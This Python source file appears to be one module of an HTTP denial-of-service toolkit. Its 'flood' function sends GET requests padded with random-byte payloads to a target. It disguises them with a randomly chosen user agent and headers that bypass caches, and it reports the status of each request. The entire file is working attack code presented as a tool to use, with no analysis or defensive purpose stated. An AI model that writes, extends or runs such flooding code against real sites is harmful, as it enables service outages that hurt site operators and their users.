import json
import random
import sys

import requests
from colorama import Fore

# Loads user agents
with open("tools/L7/user_agents.json", "r") as agents:
    user_agents = json.load(agents)["agents"]

# Headers
headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
    "User-agent": random.choice(user_agents),
}

# Flood function
def flood(target):
    payload = str(random._urandom(random.randint(10, 150)))
    try:
        r = requests.get(target, params=payload, headers=headers, timeout=4)
    except requests.exceptions.ConnectTimeout:
        print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out!{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}Error sending GET requests!\n\n{Fore.MAGENTA}{e}{Fore.RESET}")
        sys.exit(1)
    else:
        print(
            f"{Fore.GREEN}[{r.status_code}] {Fore.CYAN}Request sending! Payload Size: {len(payload)}.{Fore.RESET}"
        )
